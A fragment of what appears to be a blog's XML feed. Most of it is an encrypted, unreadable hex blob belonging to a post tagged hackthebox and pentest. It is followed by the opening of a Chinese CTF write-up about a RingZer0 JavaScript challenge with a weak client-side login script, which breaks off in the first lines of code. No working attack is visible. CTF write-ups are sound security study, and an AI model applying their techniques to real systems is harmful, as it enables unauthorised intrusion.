9d7a4be422b593a48d928d445a00a59f619ea470ab09bf97e32c2eba3b611e197bf7dbd002547f8d432d5955ecf5e787cb8171d602cd3c1af74f7b0fa5d5a79293838236f81ea009d10ad7edf91b1ac7b625735e0d5e94b0fc2968135a82a6fdadd5332dbc4a203527e625a41097c192ff450b6faad23b7c8d1bee3da1b85f58fa8ad24e2dd22b2cb0da54d34aac2fefd46e0ba9a618f548c7f2d03e7cce0a801eebcbb2f2cb7c5fd9a8bfc9cd70969c49212dbf6ab4a238f60802f65cbd71825590ba367542ab7c04a1cdd061285251e85110a102e15bcb82475b74a592ffc85c73d3b758faccfab8f85e084d273f1ef6680a6f2ef0b78e4473ff34d17413e7fe90a0b4eb0c68a99e96d86782a914dad056781c262e7b5698e5acc89c65278bb82a68bd3ca6a6ffb48b922aa5727f4516252a0879279cf8bb6817473404da71c22ae82a896d23c79d548b3cffa25eab2f179e7490526489b4c215eaa3efe9636c857bef99d577f83ee8e9808cc443d27af2ff31948ddc991704e0d5f3fa8a875e34e1052cd9109534858776e6d5ca44d1b98194af0cd13154c4d881a3005c509f5e49e8fedc17f4c5f4c249263eefb88c2ebb606125672d2efaa3dd025ca31abc0f9aa93473e68040506e9ede51b4d62fb32bdac696a7c5087cceaf7748ce3903d3e3385d6af5f157897d808d9ad2013c513cfbe922b591bee2f2b0050c7f4f57b910cfc80afc5f3173af736623820c5bc6031deba6963836e79e205e333c35e04453d744c225a90eed3ed01035e7c9d43af95124dbcaac90e8b7497e9114750eed0776349195f53145399c87e25545968fcf18c9aad144e83c954761a25f6024e51f6c5eb73c628a0dc7961e40c50f013e3b8fcbb90f4745b7b1adf5a7f550b70ac43e492cd7ca045093f0eab3e71ebe7208cd10df8ae07a0ceee4f4a4f54048af415d7e585d35161dc3b6e763b99304f21d677e35ff12492e4c7bfd5d28bd911bf34c43bfcf9045c1303637a6d6321ff1dcc0dacfd87224b04a40770cf3706563812fab2edcf7f3e61099a3ad84f6750d5df9ef25084f324202c8ceaf1a893b5572d05a56580d0c6183782c3bd1638792475f2d5811fa175da38a4e188434025a5be88d61a2c93a51e384eca7cb70daee3cbaf1404c18996e989c575f0bcac8507132c70d93382d708bc620d8fd9eb38ae9734f77fedf080131a7b2eb40d85d8a744941a183737b110d3a514da8b22b11d61e615382e1df92f1ced62f199bf0b99f2a2031f6165d6c31ae93449c631068b7ae353a9139f33940bdc3a7b8216028c95648695cb41da0e9fc1ee7c9d231e18a6b74979e3ce15516e9d708daa098cecbff099e1f212fd4ca35bdebad390ded6186f256b2dc2cd5460baad03bf6ed6fee1b75ac950c319d53d3d9794e285b997bbb514d36845e1bccba456a2c519a21ac3fd6e91e4d5a618b74cfc9fdb5ef07c456754703a173105eb05277a775ca83ee14b99e5de68d3f6794849354f8a56e5e67ae2ca5c952c152c7c7cc941d98bbcf69546a25aff3d9e7a872c0ad5319941f8729ae1fe60bc0d378e2e24bd5047a7cc5fda888e51686ff8debff1b6b7e9e28a75d105c67cf967ca2ec9b2d86b8dab7e442e77f4179e3b337385fb4d617382bdec7676a2a3f1d712c214d3f13bac82adb99d9538cd17a2c8546f1517f00edfe71d4381a45e2da7d3ba5a012fd8d127ff63823928125ef3f42396d201c48893baeed5cbdc75b7b677e487561a4d4a2c18352e418804652fe36af39e5d9ed81638abf98c1a5ec435bb716e4c89cf00006998669f72b21fe5eac0fc330fe5ac381e396eda70401fd48ceb2797467170f12d56f5befc4e4a9129d2ac9281a7e339b3598a2dc217933072a903e3f509772d460b1abbc5446d76db1e836d100c242a2169d429e8ead720d047de48216b5fe0c3601acf13b6773c5c550eb6ab18a28cff3bab3882ede739f9ec5eb2bbbe635c7b1163e2b8af47e39726a5a93c5899c0c6229e7112e24e55985efb73823eda80ef71296537cf3a6f9e53038d1ef4795950d97475d17c0afd0ca4be7ca07e7f8f34a042800141dfa5f356873cf7cc802148e922b4575073a124ff98a900dd10e6b1b07b24ce74afbaed8d3e769b4adf41957061de86869200736f789d05b2f204d2c04a0eda731f97633c21bf1d89c853c7ecb74bf7c981d60a68eb0e3354a4ae46ac074668ef51e741cf8aed47eec4714813d9eb943bb926d8a942087f864c3df94539a74b9b3422dad962e29338bb3cd69ad51e80692b879e66ef682803a6dd8b4c5df2768c14bf713f060284aae8d8ae8399b2a0b097371e0461a21a24be2f5c5b5aa1db6cbc576eac03f58e7217fbb5975e218324c2276fb0049130dc58e2c180de11fc25d3ae08105aa597be3433cbd9b0cec6c8249aadf9e5789d961c2642f506f6a6311d3f26929adc4ed6ef31583b7cd348e8d613e6a880a40b6aabd920e47e1a506d57cddf1cd65a2e558d78290cf03da9d97680bb8969c9ca258c764abf841de9da806956d95c323d9bac506638aad1b4277a67003b37962fefbb5f5a404b0b93fefd0078352bc38048f4fcc41a1d97967884fc9cbdeda937ca9edf77fb63da6a402c522e5589c5a8e02e6e51b40d4b37b5023cc9914a0d1001495f8b0cbcbb040b3ee361cc0573b073a086774b7e4cdd51c81f98900dc7740f197af19c23c1626509a7e7b9d1c090b77d568c8ef5da54fb072feed3065415848da20fd9918f8aef87e3bcc3b34f253895892d5c5fbdbb87a438a4ffa39698e595294dda68dc6fc4f2f013083fa1f3055b027e75a4df40ece110fde9c424e4b783061ee6bfd400dfaa5ca97a6f8c33a095906671409eb0fa2e06aa9ae6e2b565c5a735679cd53f1073cc0d54c3f68e10f50387cd9af2866e3c4aac4909551010baca3c46cf31e02e3192a9d9b503252faaade16d495555825ef0228673c5721ccb432884130f6bba3ca03b82be3d830f50f9ca1e1968601c2a0319d944368f242d391a7b71f75aa798dbccc7fe6728225352622aa0468e2e900b0dbda6dc0cb511a57fd00e8431ebdc78165aeb74e1c752a212d60c2a08be527fbc469e0a80c34381f8ce76cbba1cd1e446d2e68e89d7d62feff8afbc6127bcddd21cec6e5882b67d6c0b6e615d98f3aaa5a7f7c080250235d0d4612933a2b4760bf1871f271b6695527b04a550f9cd35ad803aea74af7ce8e2c64fbeda6f00a2d52130897465d88b9d537c4d67dd2668f09a44e19be04ab1aa635d3b8d0732f2a273a558f913b4f5581af2f33423d57e24e41981fcff64756a098ffa96313e9068236974092006724253f2cb462f92d1cc3334f70ace6a10fd80bb91a0bece581bea6cfa0010ed9c2b20370cc0ce1c5860c18c138c22ac8efec5398527edd26eeca6bb5fe80f97f1bd6c924cc6a6f9f519c263349ead68380251faf1d5100b50d17843233ea09b13b836bdeb73657da5409915ffa85e88c02adf62765ad50a3dd7853f90b876ad00eb9b61a0e672dd48863e33d32f7a37b8b93e995b1d3d80a7cbaf5934bc806c02d5d008c00be3a84c034acd3373ad8d3744b02d943b058b6480d711620691604c91877fba5c658c1dab2bcfdcf03cdc6e9cfa0a7f7b4f8cdeec8f3dafe62f9bfdbe4945dc4c66f5ff4247a771ee0d648b93a8d4b1534cfdd0898927d96ee0210d1e2d169520229366252b8e2c83dd83b493682ad5a4d0faaca2f5063e3800ea926dea0e26d8bcc048ca7ce39a93c97cd1f4e60b7bfeb372ae40bf4b9f28fc11ebc7a4d892b2ba67d73838cd42b2b94bf9ba728b64054b183dfb400eb91caa5621589a8022d0d821f2c0f67b8618b8c54f851b2db44f0f3e08e515a5aae833501ff0c76d69ab41141d80c28071b06918f72007e87db86b7128b22ab027f3e41daa476929bec9ef6710134f5989edc8ba3e5aebd6c201a25e52b8f228b7ded1713a91287950c152899c91af183268b3a2e40616bec1014063291678f18b0a4da6ba5939d593f05e38f925c7558eb99ed283915de8b974703c4f8a396beb82972c00fd90a03c5a0b381473ea59d67dfab9595d27c1b91108c22153acd0c63c7fe7bdec096e0f111448d70f2689bd92a495f4d693726982a64f192d42869ea5429e330079d2e421e9394e6818780e4e74f6195cf647142bdbafd94bb2227799d306459ee6a3ff616ef820dacc1d0fa7e6d9c35149ba29c18768f2ebfbb9b3cbb0dccd6f757f51e9e007a2b25d1994ae096502090fe1103249eda43b4eabe296f245c8078c0b7c56a55017f97503979a3c50fb276bdf1a224cf59950a521d3ff57b40a6a62cb29b508112e7e135d840a781be14a45c68d0454dc8b298a226a51664bcdb3abf776aa7c1c9575b838f4ecd7a30783ea6f03227a84ec2938ea9d8a91503598e75f3769af39fba9d1dc037cc2fe2705f41453e9a6bb6e6e0c79bb3f42fa8d25e6b73d5f25f42e29909c88692fed174605c1c4b850072d5d00d383bb4ca0f19dd4415d905412d6ae3b1a2e03f781982a98d3663619b0c98ae9c1ec3770128b9280fcf648f01dc3389e43e5387f38ac4e40235adf372505c9716cc166d0e7470646530f04cfe484208c27e61a8ac7e592c4a9e1667c76c29c02f500c1d82f3b7a5ced1b8a899450a27396df1902a3a0cdfc97b3b27cb90534ef36ed29a6259b69043e500a6311188b3346c9556e57e18337dee54432149023ff2c52e26a78a379113eda9c468ea1779e7f28ccc03c237756dcad43c08440143252f494817111612b996e29390996d4864e1c4ca8387118d787300bdf04a61883e4f20b664d7293a7b5ec3b7763e3ffbedf00e04f47629b0e338beef40cb55fc986504042d8f56a3e5e3a2d5a27bd158069cd9b3e70f002252c818b73fcca1cec92171f18f411249415e58f25ad59816ffab1ea25bc0c34fc33d17c6b79cca3c2523c14acdf683929176306682c06a5cf28465f03c220452081816b7f1415d06ac3524fbd829a81dcd0302b13ea23167932e15741ac2f2e14376255d216001cee746f8b78e788a73a0bfb4d9c7729be6bbf13be89eabaf9c550eaf152fa2d843fe0cadf2c6ecdaf86b8784247bee30a39c99fc04497b1f117cbceb13472fc0a761c03606fddd9485a10e8c2f090e261252d76522c0c73609e8ee6bcf4751db7638cfbed54b22c7c48dd694b236867b3527ef5dc7da3dd002bee4e86141655b8670a8a623a06ec0bfde7e8a23b23c35fa00bf4fe2dfd17a8ccc669034faae9eb8539d6224d1b5ed6de382f56b48a9ebb0fe6d9d00afeb22c2726a68cb9a1553b98b3554ac6d599f45e46902196fe84b9160bf0d95051e096cbb696de3b7d1d10b0da71307cbae247c5c454f9604bb3e8f328822bbf5509d33590d0e564084891689922138d91f90c5eb65c8f4c10f3710aa43128012bdff68d53d8af847978621fe9c400b4867b1e827ae83120abc13bd74334ae2b544852d362741f2c75a3160ef1b7b0edfedebab8941c190a1dc6ce5a7708c7e857cc3bc90099f937202d0a25ac29848fe4ade7b0f91a389b95230d84c71bae3f15fe7d3497a7014df50d2f5c4fbbf8708b3f078d30b7f8b387d716c46ab20394478bb7a5ecad593ab35e4cb865a26ccdc7d01dd8b9d44bcc203da98026c357ab948b6101db46dc15972cb06917ada6d3178f0d385f036596472bdae1e91182b2fa16ee8ad95d2cfd6ac1ff22e498a3507f814be6bf35e7dac2e31132e81f5138e1d575b89daeb7176bd633657cd4d64711dbcf6f61d9a6fa61431f34e3c2b7b01a26fe82a7e9ae8d98c3e0caa5e6555fd7916e32b094656fb175936ee3cda6d749c4145efe438f1e6a969d7c0c80d2c2f3dd1ae599413fbf175ab3d2a3d1019a495b3eb80536d0a8e9a62ce8a640d3d439f583f26865cf313d8d774f256db2237585188e8bdca75773deaf93eba46a6eee685a4539901cf2717bb5e75d08a1ac3fc625235c6bbfa54682b1ffdd952f3b4f2517c7a758bd802e79f6b25f6cbee0556e50cb5df39157a71571f47536977bd52b428e193df1798af868c1b5d565724a1973ffda4d4f6f25ae873ef2de234f94455ba51cef524444a0dbf517eacc2cc46fcde215f44b63637f208eff3edf61769c084f7c9bd54d00ea385855a9a1b9d2417b85595654519159dc7a365f47b449a6b21ca671e2d9c67a1e7e5329d8e33177e9a3de4e52250405910d8b8a9023339b7ca01f5e9def8b82f25ba2cb2920bf97165568feb1e9559d6480e3a7e8e573a75c6342fe2cc77454ad2538d48b482556b8f90544fcf5db2093840f18cbbed3983d53ff66a1f00582c64d193f22df59201e0fa01fc880586be2b22f4c81bfc898a973e467803aaa0679c521d5bed13505ec3ea01fdec48751dc9907ccfa490b4e79c8a590d32f1c4a06875d332043bacec9f9c3f8478eaa550dfd5ba040e153dde206aec7d6e30771a21d169126146a06480ad34cd02c5d3d74343d3e592304b0199a8d859959237fe13e4d63136ec6bcf51bddbf8c353530c6802b4bab61c8a20cba3d58426108a72add6c652d03179ac7664984b1afd0b3be9b35f58a92fc512f650aac0f53199ef72544a46d493356d82ea47e9eda119c32276403b0f3f28f4197ff7f511d2bd3fe89f487af02bedc6e7c75429200f4d5eecfb0e75249b53ebbfed341b034c636677d9d51285aa8170829ed9bd0d304446d92fbcff149700c9221583eab21a2cb0df3d3bd6e176cf08c3df1ae2c11129ead961d81a343ca0b5a370a88b9f9ffc3226c5319dafe75b0b0cde2a9fd31c021404cd7ab1a8d61fd2971c8678902c429312ff7e6947151a8466ed7cd5753f530c76d85cfaadd5cb455777adf87c7bc8fd5f476a33019008b9b6e39e51a69fae2eefef5e9fa31ff0dfe36dfd9672906df57a660cbf547252665b0c1b029d52088e3150aa766d3cd8e7e18923f03c51e4457fe4c998276b462970e2f884cf2b9208b0e2a0621fd4df90c66e1a29a424b134b99b177a7865a5db7e546f75b88d79144abdbad63976e88256f9f4dbc89886d097a573a554ef41ab587cb32f3a748311cf371c3c0215fa02f4679ef2e4060c6870cf675a69e55b9605a558d80e50393b13daec9f7c5417e64316293c02ecefc9d9e321029dacfe74ee18abc57c22626a5b007e7e4334944cb21d9cdfb25c8ae2812690a0088fe19b586680c665704526f39377c774bc27f45aad098b1f32679c92f7c4a725b4522f9e6741c04c6a5dd6cbdc6cecc571e4342bc975b6a1e2245299040b725c3c09582de72c9e8d3e27d4b5da347a2bfa40f467f242d5f6c43a378446679f943236d67529ab3ffa3f5d8897e4303c8598dc36fe407b27b2e2905326d1c2b31ffe65feb9295b0447261dc5ccaf151b7ac9721d918c26f70e92a75ef0b4baa307d9baec4d499e2824a0a2e79d6950d428c7372e51e57874ee3cdd35b288f626ac4dce80966d577cc6691a0742e1b61c18d1099005fc1c140dbf9c2ef141d7a07fe104131fb4dbdaf4065ac6b4cb3412382c8f5c7e404439fc1af8fcebce3cab6a260c25999989e80782d04dcf090ad4ad1dd17236489acea0ed23a32638b44c1acd00344168958dfaf679ed4938a48ef167464f07768165194348b596898150842810f8c2448ffed15eefa2756e065d3441233590fb32d10ae088bfb825b8219c2b2fddc598d51a4ea9810e0689cf4ef367c623af10d19bd7b5f80d7153fb9928a455ca24ed4a8705164383015cd926896fee3cacbde869b480080c568942bcc94a68d8165bcfea36697c19c31b16b8681f37b4715ba37fcdec32561d85a59d2907a30a61bf47cb16360da703058bd62182dddaec4294d16ec29f8562405ca8a3a1a47e56de82beeb9e8de3af50adf01bee7e3e75fb80860e0425c63191c2019825a2e7ff0fd29e8e8ae052fbc43ec1010c9076f0fb0e7da52053b335d54eace1fec7fdc4542e64a3c794063b2da768c7c0b4a9a3cd28061eec66f95fc0494939d6c241247c4a92ecde66e5df1b69801f0c34a1aca8673e02064facca6acd2fd2d531f6c64199cfe4bdccb8e2437b2ddd2047ce4a844fa34e763ebb42e4f73d5b976abb3a5c52f2a639ce5e56949ab141d46a7f83753034618a628444446acb8d6bc7a037aee90880a9810a703f0c71eb223e0431490f16b4ccaa35bd6b6593930e24b11a568f4a3b53168fe2f6bb60d56a7ea4c45096d8b9b36c075b2517784e881a459a2fdae6f4ef48faf1aaede0c589a63a5b4dc3ba77f4581f399e42c5f59726671f9ee8d46c5a690111d1b151dddf68c8662a02e4315ae71ffdd8298e60b30dd22a0abe76c4a8fad1e6069793e3a193be90f2b422ba396faa6ac100bf60d5a92e57694bf044c7a62adb1381ee7eeffcbaa4d58ec3054dc17cb38fa261c4bf5df51f79a51a2ac4eea14a320b621e855e448b017fab84c80cd8be1e0df89740a9f4e1cf20073c2a541b3dd6f9380bc54e019ec74a64b0c7d60204146339e952a059123c951836d310ab119608428bf0aebda5b8edf45dd2ff6327e001e0f41dff48ceb0e7ea635cd2ed02ea07cf8550fca0996f15ab9b5e17f09774e95aff1e76d57d5d5d9d4e995c0208fdd7670dddc8e944269dcb2db6fe62a5831841d5784d81a60f9526636f7a954b57ce50f0899763d09d691b5a95e33bf08fbb5e3b71400d30b2c33a714af965a912ff7bee0eaf8f66a072f1b90e598f06bf218a9acdd5e060efd1f32be56e0b474015404c400cdc2727a1e499edcfcad39f41b2e01369926332704a0e9375e3c58ae7e1176664e1748dd8b826a0c40565ba4800154e38f25aacb022c86b5288796af0d03c6e9f29bd3cd344b81b4b33a32a947b5d4a24fa56a42d869826842f0be8ffdc6da212c4879c3d3a2e963e3bf2b0bcb483f4a225d1732bf23ea36a70dda8dd2f9df668605a85240380b83b21d64f1bfb511cfafefb5f1f6f0bc1613d3d69acb3b02ebac62d05e77c22c4a67fe08027e7427658effd438920b2b6a3db24a2c941549ec247633a81820ae93ac90d05b8c3b33c6a8e3754abe3cb75309ca9ea988a1c2112719b2bfe63a651f88a2b1a2c90f08cd5e3978534274a3642751885a051ad72dd9ae60306d48239e1d682f75aa427134777ee5aeff32daedb0a3618a2ff4db72089e1ab790fb840c25a71c8132511e73c171d6f5d385d86b61f8c41ff4a493642ef51a018341797985ffa1714c63de2c8130affb0dbd6373cae520c54938425fe778720dac515da9908f49f626b51a8d1cf327fc0f73db6a3f8602a056e9532ba755536b50e1dce000332181cfbf95baaa24ab2881208d73bef467e6aba35d4754a155fc61ac4902333affa82d911c10fc269b6e85add65f71651e88e05804ddf839dad5e57c5d76e9692ead82fe293bf04b52c867708168baba1da0bc8ec47a3fb6d8e151ed0c7f19d287b0037e05c9c726643e7b04311060486bff759b1bbcb639781a6a414b429b748bd0b229765195612b20eb966cf43255d7bd8f9ebeec45d5251b380a0fcfe4178b31aec768c24451806aa58829f4dab96190c1236ca3a42d83d2ff86cd384f961901a8077bd23054bfb2f6f323d9795d76c471131806717a661c7d75e111dcb0fcd397afd3f751f0444dccdfd09753e947a85da4d470ccbac66fda9b38ab43922dc0dd9ee8e7fd23484c974f1f88fbad7c17aa64bd23ee57758555c59671cda9d22b6dc1f9f7640f9289d20ba84518351ed827963ff9a68459dd7e83a459580e9416dd017b44652bfdda61eaa6c76d3026c64a369fad0284a9a68c003f416cfd0bf01f13c10964a1eea65d0231e09560b3a43d60da7efe80bf073f2bf26c23acf35074e36afe16cb6d64f21a4215f7105664d2d2f13c1b6ff8f6996170e5ad18b7d6567b84ca6a63aa1e308ecc8840e4b58038287d3bcb14ec2bea8723daad4a27e89a3db20bfec916db5c9d57e78b7d12c977c01cb0753c4d03427cac3331341ba438896a70b46c1966bb80f8481b0257c2b4f2a52f9349b0d37de0e5953c80495f9818d105ec9697182cd6144ed12d4abef3156ed15ceb9dc20d167c76b7276e6d24d054643eac608b2006bcf89a69ea101145bfc08ca5ec46f8ee0a5a1b72c04afd77712a9c34b66cbf5f851b87f43b4aa796b1a14307f1a890d515b8d5559ce04d056f2a925a6e33f62eda34c20639dcd76b64da032820af959bb289bb20833a53314afce8064cb34f60c23ef0d095ef0e0c0df61f47748073085ebcc6f845b31b86f99c83699a52e2f259f7b97ab48c8408422729934f96fce2f99425bd5739fa7fca0390c7e26f8a8379c21dcd9475b2cf216bb1bef9edc1a770c901bff94cf9d4eb7b633c4dec6d44cb4a429f9f117b8bad7c16e9649caca672c651f45b241856518378f5271e20284e8d0f37210118158cc34cab5ee9bacd77aa6c1ed11fffa8d8b2725f538979724a7b15e7e2d276346c674f9a7f935a6121884fe973d0befc06cb471b40f9e0602853272a581bbd279138e03f69589d2d41221d700836ad0a4708f6f653a3dd335aa877385771850e1a5dc77cb1797c02ecba84b09f984944b844044e05b87f0ee7b339ff8f98f20fcdae9fe51772916a5d2163724120f3e2829f8c1fb0a06d35e22bcff2b7b9af8d529fa00ead5a63c921ae0b0c3fb2e05d16fd5aba4de6186cd538225a5d32c669d7a8eda0d2d4a54c447a9f2084cf1210f0dcc4dbc22f4043f3c1cb48d36c29d3ba137c7d14cb1fd8beaea6787ae5ad71e918e045c401f206f6e0332d9eeeeafeb0f20a344892e484c0eb4439db859b90f2a26f59a909be808bcd383b7dfaef258a8156b00ae654dd04feafe3a5a11c45c310dd97c6e141c666a820e770decda2c1a959572497f09b3168a4d9e77a1fe6e975b140d663aef45005b6b8920c2da3f0627fdbe4c41069acd230a7cebc1d652784326d9ebb53980a7dd1db78d871b59e0ef485106991090b6f0d8d1679cfc05224fa1abc3dab5715b1477f883449ab8ca25c794c9c6e6037247273afefc8188eb156aa02c28ca8d2f0f35eb284c3ba3ca35024afceb5b2f15b17b7229182db0118a9b9ef961e3336f6373f9d68321506f469b75a19aea36a16f6ae2d3308fb6cdeb2259fc9d07e6f3dacbe2efda20ed5f0ae9f63c92dd08e2f2fb5b7d57dc7089cf1b766f1e9b7c311176528d72b617324beb7d2c03534e91a8da33d46a23b0208aa1669941290986757f8cb9d1ba78755495bddc1fbf7b8235c595de23bbeb44dd87ea081103635b3b9d686691d02577c97d2541298926d41e4586b46bd1f9d4792db75ed040e657bc3e65c3bac8a24e90772617a21cb833d28cb7facf3f2be479dff5accd07e9ea6a9448cc1c9c5d596efc01acb1a7c5c3b794ff3628106bb886afe1fc219fba6031a51d7ac62641bff78f87181a9d572503706e5bb94ceee573d1476a3c9ab8ea770f5e63b28cb75e95eef54b6221b12ea29e7531abe0a19c465e63208899b82f8d8ed548384e7b6fc63c588d144f9058c7a7bbbf18e57e3a0f467cc32ab9c804080566eeabd979e7792b43877100b3388c27805346b227811c6cfd43ddb0d33532353773446c5f769f1bb3ab42ef3d33290bbb63d4310c4226043916f5e0a9c406b8162ed070a4768a23a4e06b59a1ae46fa69ab4a0152818701fe558f274f6926694baf170ae72350d7c3067052ca3c63464b6cd99697f7049cd760dfae6f55984d49d853413cdde9102206192e3fa3e2093a410e6a93b86cc463b37269581de7915d6b0ac51236974a19f8e4af538b0d7c5bb157016e3675d79dbc63deb46fdbc58da0c3199dd7241eac2f53be9e08152a642b630949cb9aa905696764265c33a306a85eeaee0f67fc4d5b340fbc8a52bbf9beb10142fdd424b452a04cc3dc408fd333b0238f1b4811bdd7ee61237f584315adf15c016cbd7efba174c47b6800f945ef765ddef1f03199a4af761e68ef6b2a9daca174b9aaafb1efa4a88bd6fc466afb8be4618b65dfe3b140a2c0a32bcc823d42bdd47c821a500443a9789dd058aad5a9625b28b3ca0e65e461579c0b8e23da22a17bc6ae8c2266ee8344204aa95bf3283364c83fe68962052ff3a72a10f7768b1937fe4fc5c957df14d71a3469a61e62f085b19e858870740075994def30b6a20ae1151286f10a2a90b6243bb12fd387e1356aa708b1060d3460ea2c5feea17c6e818caf83f36cbac0a99d7eeea2ec4d8d83eb2d5e572e669efe7c3b82934ef049f99e18d5260fdf5640f88c8358603bb85a7b8b0e36ab206c45cec53ce3e78092d4a31e5f97d2e433444a9eee0b7e2b640db16bf30a1743286c447a95dec107e1a6911d8ee2b460f45af9342e05bb57227919eed5f7cd483ba20066bd13523c487c99151111f8628cbaf7018e3c12a7dc5ddcea93ddbde01a7637e0259ae2645338ed7b5c65e3bc1de061f63db0d753cf7ac231efbdf1357591bca6d569736c811f059f39916633f424de364e21d811634722a68adf214c3a2b8c0b26c3391e6ddb618857589dc259c8fa2369862f3d5d1ca0f262ff2200e4794262e4407d78f0581ebb3873d7d4992a39c404ea129c8d7b5fe3de3e1f4bdddd483b2f96a6fdcbec275646d3137b89a829732163aabea68790561b42a712a2b0fd11e9ea65412cf98c8919875f6d3d19c002c70d518f57e44cd92541cdd970b8f8a85ea4b368b4cb99982188623f1ac17ff64ae4651f369191c8b5408d92d89991cf6d2b1c93aa1e257531ede7d5055af2a148faeaf15e5a0a3217ad09864389accd5fc4d5c48fab2e132746abe91dfc7fdeb05c68ca2d43f29031f45041a85adc17203beaaec1f582fbd868c6191fbfa8edfd70a2afe6f7e940f9d57df7d6f7cc7814b89d42a5fbff9354bf8243bc43ae06a46d48878b73d7635c7d6c95e53baca3623a39f4f4a7e5640741a3f4055aa0c5fd33bc6200f06b361644983d47cf183c0c5e39e8c8352b4812c6d9932726b2ec6804cdb9a6fdaec8a43f68af8221c50aa0a46175c7239f10108657cff9a46efd6fbe948370cb5997fb2f1a31aa14c7cfa62760618a2c5b40eec50a1a5962c3b6975363b99b9f7bbeccb79b73471e19f2c062212670f94b99823374b7285fb1c6d00477d3d21fe398a2ee16c55aec68f25c4fe115872148fc099b854eba779358065204c3e01960b5b26eb36f7e81f0ffde5230bd1e81f3f7a64309c51635112b50c68b4e38777c295e11e6398b87963c5892df710169deac87c785c5b9154e419ab614a1dc2b0c8a8917d083ea32ca96d92d71d8cade16b4ea8fbb0814f1ef437a775ffb841e2b7d5282f970f01fb5c87c4fe2ba310b1a82c0a97110d32676f41a243d72a8da42e84e1b1af2669db96fdf78d8cd1c3c96a9c63ecb3ffe9088336ffadc0197c383a438e2cb7666e49f0ef475dbe935ef9d1dd0a17060e23205df0d3870e16ca9b1b05b8fe69fe72df78b187433b29a736aba332aa90f7f50184ffbe1924dd79c1eca66ff7d175251ca02d7e87b84c15054458f092d97e2ade79db5f09efedd473b76e623cf1ad2875d2cf7ffce50083961250979111f3d0694a4df3f90cdbad55db09a61e1db98383f42cd39545515351687c5ee4e4a1e003a07d22349b34ecc229a612cd8b3643a5ea91c1e5c962eca07b0134e1d075b8b849fdafed8d66eab1192b5190b99cf3f0af89e659d3d8a1105cd636563901bb012752702b6ec94cc2274861ef78bbb06dad2c4bf8728c3f13f6fea79118cbc12fbca9f5640c23f5ad3337c2be0456b689fe52306c1f46c7e361a3b76cd3e325f76a61b6ab59ec9b0db67b9a6e4694fad60adbee65a78db9cbbdd4dd982aab3c9e12869cc6bb77814f307e63775ba405bdafe02e6b587ce218d03b38f793a6d66f49775c3ed17dd1b4459d8cf529823fac2aa2f5c7f83153ca659e49434827615b7071a137cea3d1b4b822513f0017368f85945bf454a124a2ab9c064cc22a9d749f13ef5bc3112d7167a69b3deda5c33130e926155d85165570a190d71a918af21f84b7e7cb5dfab0216de2f762cdcc419f04a418e7560e94c827c74318e8e05ddf7371cc2176b4ebdb918a338edaa429d2fcd2ba35f20f8f5995038bdd40efbcbea1f7dfb9254987105014584b67cc8d6f08295857e43bfdeb451a20e53d19d0be1c4358b28c502af851aa9050a0f9e8c1963a050af4f2941ae9470b453d854fd2ea9ee9f375a04e3f22f45366bbc5c832ac1620517ddd5a2ddcf33664d747d9a3d9c61ecdaed42b080718cba76e3f1e0dc352c546bf0728267e2c931471004de26cb64ed1da38d535ea1ba0316d65187ed20f763b25f415990f2f1bd99efee97c77c9abe82902a7986570f72688a9b46f8f0fa921e459c1c6f4a364629a174a330872416c2a4ca931cdc13047d53de442a253b81855db556b6f7b597a3d6b62ed44a0fc8ab7872e07fa35787745473fb415a085aa92b63965f92ec2ef109d54a3e5123643ee01ba90f34ca553e832f506ba11dfe114d51ff4a694b2349357a2dcbd2630717f7540af88704e3a544f8df3f56b249e20a3a3068d4478308a0806295a234b6b86d46d8a763953a9b5947ccb530dbf6f19ab8b37df4e0b321161df51eb0e9912f138baafdfbc8a4dedfa89df3878934cc792bff2cca41365a1e6ae7eb70d10723723966a6fe24a4b450370b35387c580defc1a671bd5568bc8424ad33321887e9f36949e245fe2a4f16a2fb9a3db5a7e88cdfc005ea2b76e080dd035a9c3011ff2e26edfbcd6e4681cd325193d3abfa630b3597d079c8c10ff19478a634f4df2df2c45f249f9c2c25d3a23c6fa314136fc7a79059ce83af361cdbd4b5bbcd6a4c65d7680219b2d47955656ea5927baebccd89249a64cdcd66c098d7c9d400220afe5c581aa7e21afe2f8ee22ea2e475d83d400fbd2f5809a536fb7c8e8e08e56c63de766bce5249f81eb33be470ea0f27563a22484be527b0c4c979d0f57c0514a92985562e48890360d7435771fecc278b44fcb6f7906fc877e1d21fe7636b1a71781983a7c114777fda279b8e53ded9d27259084ee54efb0ba361f193d60f8b535ae73362948020333d97fb85ac28c96b463209abe5d85ede24fda95c76fd359b7ff1be099552daef5d66dd2ac4010bc59e36b2076a4bdae4a7844d744ef2dadb3a5782011183bca744f63efad62e4fd7958ee2c29c5dfde9a9809c3da68e6c398b8876e4c7f8bf7861bef663a4437ceb934c8db9d66872064340cba95fa6c3eb6031a7d7a26cdedf533bd2f7e862618c33a66047f3428315210f8523fdce1aa43ec477e08f49b02a06c2051b95c9484741c5f2b24fc5f506d5adfb92aa637303cd3c19ec46d48b985be1363c64bd6d068d3b830fd5b78dcaa0ec4168c1872007d6a980d24f58ef835d4a131639d0c3d14e33e33cd382a2</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RingZer0-CTF JavascriptChallenge</title>
      <link href="2020/07/22/%C2%96RingZer0-CTF-JavascriptChallenge/"/>
      <url>2020/07/22/%C2%96RingZer0-CTF-JavascriptChallenge/</url>
      
        <content type="html"><![CDATA[<p>在网上无意间看见一个CTF 解题平台，感觉里面的分类还挺有意思的。于是挑了一个javascript challenge来做一下。最近做题时经常感慨js的很多弱类型特性远比php丰富的多了，所以借此机会简单接触下js的魔鬼代码</p><a id="more"></a><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>首先js类型的题目必然是在静态页面就可以找到源码的。有时会加混淆，但混淆的机理其实基本上都挺一般的。这里直接查看页面源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Look's like weak JavaScript auth script :)</span></span><br><span class="line">$(<span class="string">".c_submit"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">   